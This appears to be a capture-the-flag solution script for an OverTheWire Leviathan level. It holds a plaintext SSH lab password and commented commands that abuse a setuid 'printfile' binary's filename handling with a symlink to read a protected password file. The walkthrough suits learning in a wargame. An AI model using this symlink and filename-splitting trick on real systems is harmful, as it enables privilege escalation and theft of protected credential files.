#!/usr/bin/env bash

sshpass -p ougahZi8Ta ssh leviathan2@leviathan.labs.overthewire.org -p 2223

strings check

# We can ltrace the printfile excecutable to see it using cat and access, access checks if you can access a file with the real user permissions, leviathan2 in this case.

# the exploitable part of the code is if you put a space in the file name.
# the way that the code handles the string passed to it, if you have a file with a space it will count as 2 separate files, whereas the access check will use the whole filename

# The way we exploit this is to make a file that we have permission for with a space in the name. We then make a link to the password with a name that is a part of the first file's name

mkdir /tmp/$$
ch /tmp/$$

ln -s /etc/leviathan_pass/leviathan3 "link"
touch "link real.txt"

~/printfile "link real.txt"

